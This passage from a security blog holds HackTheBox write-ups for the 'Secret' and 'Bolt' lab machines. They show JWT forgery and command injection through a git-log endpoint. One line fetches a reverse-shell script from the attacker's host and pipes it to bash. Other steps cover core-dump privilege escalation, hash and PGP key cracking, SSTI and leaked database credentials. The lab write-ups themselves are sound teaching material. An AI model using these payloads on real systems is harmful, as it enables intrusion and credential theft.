'{\"name\":\"theadmin\",\"email\":\"theadmin@dasith.works\",\"password\":\"admin1234\"}'Name already ExistIt shows that it already exist. We need to login as theadmin so we can get the role privilage so in order to bypass the condition I set one space infront of theadmin name. and register it with the curl command.root@Rav3nCLaW [10:52:19 AM] [~/Documents/htb/secret] -&gt; # curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{\"name\":\" theadmin\",\"email\":\"admin@dasith.works\",\"password\":\"admin1234\"}' {\"user\":\" theadmin\"}Then login into it and we get the jwt tokenroot@Rav3nCLaW [10:56:42 AM] [~/Documents/htb/secret] -&gt; # curl -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@dasith.works\",\"password\":\"admin1234\"}'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJhZG1pbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mzk5NjkwMDV9.MRp-w0TwkkQCnaU-FXpb8GuUA-WG-2fuFFTG7fPFB2From the jwt.io we can see that theadmin name have one space and we can get the jwt token.Payload of the curl commandBut as we check for the privilage we do not get theadmin privilage. I guess because we put space and we do not get that. I erase the space and try it again but it return invalid token.root@Rav3nCLaW [11:05:26 AM] [~/Documents/htb/secret] -&gt; # curl http://10.10.11.120/api/priv -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.2_lODVTEONZFoluz_xGgc5w90ChYO56_p4pRR9iYDxA'Invalid TokenAs for now we can change the payload data and we get the secret token and I put the secret token to verify the signature. Get the new token and try it as before.curl http://10.10.11.120/api/priv -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}Yeayy got it but what to do next ??? As idk what to do i found somethin new in /2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b/routes/private.jsconst router = require('express').Router();const verifytoken = require('./verifytoken')const User = require('../model/user');router.get('/priv', verifytoken, (req, res) =&gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ res.json({ creds:{ role:\"admin\", username:\"theadmin\", desc : \"welcome back admin,\" } }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) }})router.get('/logs', verifytoken, (req, res) =&gt; { const file = req.query.file; &lt;&lt;&lt; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =&gt;{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) }})router.use(function (req, res, next) { res.json({ message: { message: \"404 page not found\", desc: \"page you are looking for is not found. \" } })});module.exports = routerGuess not all commit show another have of this private.js code. As for the code it use the get method with /logs and the code with req.query.file think will be parameter for the logs get method.#get rce root@Rav3nCLaW [11:31:55 AM] [~/Documents/htb/secret] -&gt; # curl http://10.10.11.120/api/logs\\?file\\=\\;cat+/etc/passwd -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'\"80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\\npollinate:x:110:1::/var/cache/pollinate:/bin/false\\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\ndasith:x:1000:1000:dasith:/home/dasith:/bin/bash\\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\\nmongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin\\nNow we can get the reverse shell and we can get it with our own bash reverse shell where we curl our file to the machine and execute it.root@Rav3nCLaW [11:49:57 PM] [~/Documents/htb/secret] -&gt; # curl http://10.10.11.120/api/logs\\?file\\=\\|curl%20http://10.10.14.84:8000/revshell.sh%20%7C%20bash -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMwYTRiZTRhZmVhODA0M2VlMDEzNjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDAxNTA1OH0.FL2H-2FwHFWTa1gz9PRrYWRrgKk1QlOIJM1kwWj29Q0'Privilage escalationThe root privesc is not easy and I run the linpeas to check the possible outcome to privesc.Found c program in /opt directory then in the code there is a function that can be use to get the code dump of the program.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;linux/limits.h&gt;void dircount(const char *path, char *summary){ DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) { printf(\"\\nUnable to open directory.\\n\"); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL) { ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, \"/\"); strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name)); if (!lstat(fullpath, &amp;fstat)) { if(S_ISDIR(fstat.st_mode)) { printf(\"d\"); ++directories; } else if(S_ISLNK(fstat.st_mode)) { printf(\"l\"); ++symlinks; } else if(S_ISREG(fstat.st_mode)) { printf(\"-\"); ++regular_files; } else printf(\"?\"); printf((fstat.st_mode &amp; S_IRUSR) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWUSR) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXUSR) ? \"x\" : \"-\"); printf((fstat.st_mode &amp; S_IRGRP) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWGRP) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXGRP) ? \"x\" : \"-\"); printf((fstat.st_mode &amp; S_IROTH) ? \"r\" : \"-\"); printf((fstat.st_mode &amp; S_IWOTH) ? \"w\" : \"-\"); printf((fstat.st_mode &amp; S_IXOTH) ? \"x\" : \"-\"); } else { printf(\"??????????\"); } printf (\"\\t%s\\n\", ent-&gt;d_name); } closedir(dir); snprintf(summary, 4096, \"Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n\", tot, regular_files, directories, symlinks); printf(\"\\n%s\", summary);}void filecount(const char *path, char *summary){ FILE *file; char ch; int characters, words, lines; file = fopen(path, \"r\"); if (file == NULL) { printf(\"\\nUnable to open file.\\n\"); printf(\"Please check if file exists and you have read privilege.\\n\"); exit(EXIT_FAILURE); } characters = words = lines = 0; while ((ch = fgetc(file)) != EOF) { characters++; if (ch == '\\n' || ch == '\\0') lines++; if (ch == ' ' || ch == '\\t' || ch == '\\n' || ch == '\\0') words++; } if (characters &gt; 0) { words++; lines++; } snprintf(summary, 256, \"Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n\", characters, words, lines); printf(\"\\n%s\", summary);}int main(){ char path[100]; int res; struct stat path_s; char summary[4096]; printf(\"Enter source file/directory name: \"); scanf(\"%99s\", path); getchar(); stat(path, &amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); &lt;&lt;&lt;&lt; printf(\"Save results a file? [y/N]: \"); res = getchar(); if (res == 121 || res == 89) { printf(\"Path: \"); scanf(\"%99s\", path); FILE *fp = fopen(path, \"a\"); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\"Could not open %s for writing\\n\", path); } } return 0;Meaning of the function https://www.tutorialspoint.com/unix_system_calls/prctl.htmThe idea is to make the program crash and the program will return the core dump in /var/crash The idea to crash it because the file of the cannot be write and since the function of pcrtl got in the code maybe it is the way.https://unix.stackexchange.com/questions/139071/what-are-the-files-located-in-var-crashhttps://wiki.ubuntu.com/CrashReportingRun the count program and check the PID of the program to make it crashkill -SEGV 45739After kill the process we know that crash dump at the kernel will be at the /var/crash . Then use the apport-unpack to extract the core dump.Get the flag and submit it." }, { "title": "Bolt Hackthebox", "url": "/posts/Bolt-Hackthebox/", "categories": "hackthebox, writeup", "tags": "subdomain, crack, sqlite, SSTI, pgp", "date": "2021-10-11 00:00:00 +0800", "snippet": "BoltBolt is a medium machine on Hackthebox. Start with an archive that we need to download and in the archive got credentials that we need to crack. Vhost is found and we can log in with the credentials that we crack before. The vhost is vulnerable to SSTI and from there we can craft our own SSTI payload to get reverse shell. From there with enumeration we found pgp private key block where it can crack. A message need is engrypted with pgp and then decrypt the message with gpg. From there we can get the root password and gain root.ReconNmap scan22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkj3wwSWqzkYHp9SbRMcsp8vHlgm5tTmUs0fgeuMCowimWCqCWdN358ha6zCdtC6kHBD9JjW+3puk65zr2xpd/Iq2w+UZzwVR070b3eMYn78xq+Xn6ZrJg25e5vH8+N23olPkHicT6tmYxPFp+pGo/FDZTsRkdkDWn4T2xzWLjdq4Ylq+RlXmQCmEsDtWvNSp3PG7JJaY5Nc+gFAd67OgkH5TVKyUWu2FYrBc4KEWvt7Bs52UftoUTjodRYbOevX+WlieLHXk86OR9WjlPk8z40qs1MckPJi926adEHjlvxdtq72nY25BhxAjmLIjck5nTNX+11a9i8KSNQ23Fjs4LiEOtlOozCFYy47+2NJzFi1iGj8J72r4EsEY+UMTLN9GW29Oz+10nLU1M+G6DQDKxoc1phz/D0GShJeQw8JhO0L+mI6AQKbn0pIo3r9/hLmZQkdXruJUn7U/7q7BDEjajVK3gPaskU/vPJRj3to8g+w+aX6IVSuVsJ6ya9x6XexE=| 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF5my/tCLImcznAL+8z7XV5zgW5TMMIyf0ASrvxJ1mnfUYRSOGPKhT8vfnpuqAxdc5WjXQjehfiRGV6qUjoJ3I4=| 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxr2nNJEycZEgdIxL1zHLHfh+IBORxIXLX1ciHymxLO80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D| http-methods: |_ Supported Methods: HEAD GET OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Starter Website - About 443/tcp open ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4| http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams|_Requested resource was /auth/login?redirect=%2F| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AUFound the domain name of the IP and the subdomain of the IP. Add it inside /etc/hostsCannot register to the page since it return 500 internal error.root@Rav3nCLaW [05:49:49 PM] [~/Documents/htb/bolt] -&gt; # ffuf -c -u http://bolt.htb/ -H 'Host:FUZZ.bolt.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -ic -o subdomain-80 -fs 0,30347 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method : GET :: URL : http://bolt.htb/ :: Wordlist : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.bolt.htb :: Output file : subdomain-80 :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 0,30347________________________________________________mail [Status: 200, Size: 4943, Words: 345, Lines: 99]demo [Status: 302, Size: 219, Words: 22, Lines: 4]MAIL [Status: 200, Size: 4943, Words: 345, Lines: 99]Found new subdomain and will enum to the subdomain.root@Rav3nCLaW [05:46:27 PM] [~/Documents/htb/bolt] -&gt; # ffuf -c -u http://bolt.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -o 80-scan /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method : GET :: URL : http://bolt.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Output file : 80-scan :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________download [Status: 200, Size: 18570, Words: 5374, Lines: 346] [Status: 200, Size: 30347, Words: 10870, Lines: 505]login [Status: 200, Size: 9287, Words: 2135, Lines: 173]contact [Status: 200, Size: 26293, Words: 10060, Lines: 468]services [Status: 200, Size: 22443, Words: 7170, Lines: 405]register [Status: 200, Size: 11038, Words: 3053, Lines: 199]pricing [Status: 200, Size: 31731, Words: 11055, Lines: 549]logout [Status: 302, Size: 209, Words: 22, Lines: 4]sign-in [Status: 200, Size: 9287, Words: 2135, Lines: 173]sign-up [Status: 200, Size: 11038, Words: 3053, Lines: 199]A download directory make us to download an image.tar. Download it and got many directory.Enumeration of demo vhost. A register form that different from the passbolt.bolt.htb/register. Form of the demo vhost need an invitation code.Fuzz result of mail.bolt.htbroot@Rav3nCLaW [09:05:41 AM] [~/Documents/htb/bolt] -&gt; # ffuf -c -u http://mail.bolt.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .txt,.php,.js -t 50 -fs 162 -fw 345 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://mail.bolt.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt :: Extensions : .txt .php .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 162 :: Filter : Response words: 345 ________________________________________________ Documents and Settings [Status: 200, Size: 4973, Words: 347, Lines: 99] Documents and Settings.js [Status: 200, Size: 4976, Words: 347, Lines: 99] Documents and Settings.txt [Status: 200, Size: 4977, Words: 347, Lines: 99] Program Files [Status: 200, Size: 4964, Words: 346, Lines: 99] Program Files.txt [Status: 200, Size: 4968, Words: 346, Lines: 99] Program Files.js [Status: 200, Size: 4967, Words: 346, Lines: 99] SQL [Status: 301, Size: 178, Words: 6, Lines: 8] bin [Status: 301, Size: 178, Words: 6, Lines: 8] config [Status: 301, Size: 178, Words: 6, Lines: 8] installer [Status: 301, Size: 178, Words: 6, Lines: 8] logs [Status: 301, Size: 178, Words: 6, Lines: 8] plugins [Status: 301, Size: 178, Words: 6, Lines: 8] program [Status: 301, Size: 178, Words: 6, Lines: 8] public_html [Status: 301, Size: 178, Words: 6, Lines: 8] reports list.txt [Status: 200, Size: 4967, Words: 346, Lines: 99] reports list.js [Status: 200, Size: 4966, Words: 346, Lines: 99] reports list [Status: 200, Size: 4963, Words: 346, Lines: 99] skins [Status: 301, Size: 178, Words: 6, Lines: 8] temp [Status: 301, Size: 178, Words: 6, Lines: 8] vendor [Status: 301, Size: 178, Words: 6, Lines: 8] tell_a_friend.txt [Status: 200, Size: 0, Words: 1, Lines: 1] urls.js [Status: 200, Size: 0, Words: 1, Lines: 1] webim.txt [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [18632/18632] :: Job [1/1] :: 384 req/sec :: Duration: [0:02:02] :: Errors: 0 ::The result shows a lot of directory but need to pass the login page first.As we got and image from /download we enumerate of the directory and check one by one does it have any informative file.root@Rav3nCLaW [10:56:55 AM] [~/Documents/htb/bolt/download/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer] -&gt; # sqlite3 db.sqlite3 SQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tableUsersqlite&gt; Select * from User;1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||Got the admin passwordroot@Rav3nCLaW [10:58:14 AM] [~/Documents/htb/bolt] -&gt; # john -w=/usr/share/wordlists/rockyou.txt johnhashadmin Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdeadbolt (?)1g 0:00:00:02 DONE (2021-12-24 10:58) 0.4739g/s 81850p/s 81850c/s 81850C/s debie..daneeUse the \"--show\" option to display all of the cracked passwords reliablySession completedroot@Rav3nCLaW [10:58:38 AM] [~/Documents/htb/bolt] -&gt; # john --show johnhashadmin ?:deadbolt1 password hash cracked, 0 leftThere is a chat where it says that the demo is restricted to invite only so its mean that demo have the invite code and other register page do not have it. Since sarah says that docker image need to be scrubbed then it must have somthing inside it.Found code where the id need is invite code so it must be somewhere inside the directory.Explore the grep command to search about the invite_code that i found in the code above.grep -iR 'invite_code' -A 2 2&gt;/dev/nulli - ignore all the case letterR - recursively read all the files and follow the symblinks A - print all the trailing match line FootholdAfter login as the user that already been created it redirect to the profile page. The page have the function to change the username of the account.Try to put XXS payload but got nothing also the SSTI payload but got nothing changes at the page. Then login into the bolt webmail with the credential that have been created. At the page of the webmail got many email that says the email have Please confirm the email changes.Check inside of the email and see that the username is change to 16.SSTI is the vulnerability.Put the reverse shell in the name input form and and click the link at the email and got the reverse shell.Then in shell as www-data, www-data have its group directory which is /etc/passbolt. Found db creds inside it.//passbolt.phpreturn [ 'App' =&gt; [ // A base URL to use for absolute links. // The url where the passbolt instance will be reachable to your end users. // This information is need to render images in emails for example 'fullBaseUrl' =&gt; 'https://passbolt.bolt.htb', ], // Database configuration. 'Datasources' =&gt; [ 'default' =&gt; [ 'host' =&gt; 'localhost', 'port' =&gt; '3306', 'username' =&gt; 'passbolt', 'password' =&gt; 'rT2;jW7&lt;eY8!dX8}pQ8%', 'database' =&gt; 'passboltdb', ], ], // Email configuration. 'EmailTransport' =&gt; [ 'default' =&gt; [ 'host' =&gt; 'localhost', 'port' =&gt; 587, 'username' =&gt; null, 'password' =&gt; null, // Is this a secure connection? true if yes, null if no. 'tls' =&gt; true, //'timeout' =&gt; 30, //'client' =&gt; null, //'url' =&gt; null, ], ], 'Email' =&gt; [ 'default' =&gt; [ // Defines the default name and email of the sender of the emails. 'from' =&gt; ['localhost@bolt.htb' =&gt; 'localhost'], //'charset' =&gt; 'utf-8', //'headerCharset' =&gt; 'utf-8', ], ], 'passbolt' =&gt; [ // GPG Configuration. // The keyring must to be owned and accessible by the webserver user. // Example: www-data user on Debian 'gpg' =&gt; [ // Main server key. 'serverKey' =&gt; [ // Server private key fingerprint. 'fingerprint' =&gt; '59860A269E803FA094416753AB8E2EFB56A16C84', 'public' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey.asc', 'private' =&gt; CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc', ], ], 'registration' =&gt; [ 'public' =&gt; false, ], 'ssl' =&gt; [ 'force' =&gt; true, ] ],];Privelege EscalationWith linpeas find a directory email where it contents of an email between eddie and clark.eddie@bolt:/var/mail$ cat eddiecat eddieFrom clark@bolt.htb Thu Feb 25 14:20:19 2021Return-Path: &lt;clark@bolt.htb&gt;X-Original-To: eddie@bolt.htbDelivered-To: eddie@bolt.htbReceived: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)Subject: Important!To: &lt;eddie@bolt.htb&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)From: Clark Griswold &lt;clark@bolt.htb&gt;Hey Eddie,The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account.Once you're set up you can start importing your passwords. Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...-ClarkFind pgp private key block ~/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf$ then turn it into hash with gpg2john and crack it with john.root@Rav3nCLaW [01:48:31 PM] [~/Documents/htb/bolt] -&gt; # cat pgp.hash Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::pgp#the password of the hashjohn -w=/usr/share/wordlists/rockyou.txt pgp.hash Using default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 16777216 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusmerrychristmas (Eddie Johnson)1g 0:00:28:22 DONE (2021-12-26 14:17) 0.000587g/s 25.17p/s 25.17c/s 25.17C/s merrychristmas..menudoUse the \"--show\" option to display all of the cracked passwords reliablySession completedIn database there is PGP Message.-----BEGIN PGP MESSAGE-----Version: OpenPGP.js v4.10.9Comment: 